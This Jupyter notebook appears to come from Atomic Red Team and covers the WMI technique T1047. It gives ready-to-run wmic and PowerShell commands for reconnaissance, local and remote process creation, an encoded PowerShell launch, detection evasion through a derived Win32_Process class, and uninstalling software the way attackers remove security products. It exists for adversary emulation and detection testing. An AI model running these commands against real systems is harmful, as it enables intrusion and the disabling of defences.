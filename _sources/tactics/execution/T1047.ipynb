{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "84c04465",
   "metadata": {},
   "source": "# T1047 - Windows Management Instrumentation\nAdversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)"
  },
  {
   "cell_type": "markdown",
   "id": "f026841a",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "db242cab",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - WMI Reconnaissance Users",
    "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic useraccount get /ALL /format:csv\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24cf1a07",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ed02d1c1",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - WMI Reconnaissance Processes",
    "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic process get caption,executablepath,commandline /format:csv\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8acfd019",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "58089803",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - WMI Reconnaissance Software",
    "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic qfe get description,installedOn /format:csv\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61b571d7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "48570c0f",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - WMI Reconnaissance List Remote Services",
    "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreachable\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic /node:\"127.0.0.1\" service where (caption like \"%Spooler%\")\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca67225f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "e36aac4d",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - WMI Execute Local Process",
    "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic process call create notepad.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4c6bcf3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "420ac337",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nwmic process where name='notepad.exe' delete >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75c7a593",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "278a5c10",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - WMI Execute Remote Process",
    "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process call create notepad.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1030c9af",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "92540011",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nwmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8cfd0f1d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "62521f46",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Create a Process using WMI Query and an Encoded Command",
    "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\npowershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1e805cdd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "71c2b041",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Create a Process using obfuscated Win32_Process",
    "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"Win32_Atomic\")\n$NewClass.Put()\nInvoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a4c76e97",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "57d80160",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Atomic\"))\ntry { $CleanupClass.Delete() } catch {}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d869354c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6ed51c76",
   "metadata": {},
   "source": "### Atomic Test #9 - WMI Execute rundll32\nThis test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: DLL with function to execute must exist on disk at specified location (#{dll_to_execute})\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "43e0044e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e4f8bec0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic /node:127.0.0.1 process call create \"rundll32.exe \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll\\\" StartW\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80a32f2a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "84688e00",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntaskkill /f /im calculator.exe```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4fb811b1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b0cd9941",
   "metadata": {},
   "source": "### Atomic Test #10 - Application uninstall using WMIC\nEmulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: TightVNC must be installed.\n##### Check Prereq Commands:\n```cmd\nif ((Test-Path \"C:\\Program Files\\TightVNC\\tvnviewer.exe\")-Or (Test-Path \"C:\\Program Files (x86)\\TightVNC\\tvnviewer.exe\")) {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile \"PathToAtomicsFolder..\\ExternalPayloads\\tightvncinstaller.msi\"\nstart-sleep -s 10\nmsiexec /i \"PathToAtomicsFolder..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart\nstart-sleep -s 15\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db47e0a5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e3c6b210",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic /node:\"127.0.0.1\" product where \"name like 'Tightvnc%%'\" call uninstall```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37271320",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "db5f24ae",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nmsiexec /i \"PathToAtomicsFolder..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b91c2be6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1047 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "12cd2414",
   "metadata": {},
   "source": "## Detection\nMonitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)"
  },
  {
   "cell_type": "markdown",
   "id": "c62dea38",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Admin Access \n Modify a user's administrative privileges.\n \n\n Changing the target system to allow or disallow users to perform tasks requiring administrator level permissions gives the defender leverage in inhibiting or facilitating attacks.  The procedures for changing these permissions vary across different operating and software systems.\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to allow or restrict admin access to support your defensive objectives.\n#### Use Case\nA defender can remove admin access from the local user to prevent an adversary from being able to utilize WMI.\n#### Procedures\nRemove an account's administrative access from a system or service to require an adversary to reveal techniques for elevating privileges in order to accomplish certain tasks.\nGrant an account administrative access to a system or service to enable an adversary to take advantage of those privileges if they compromise the system or service.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}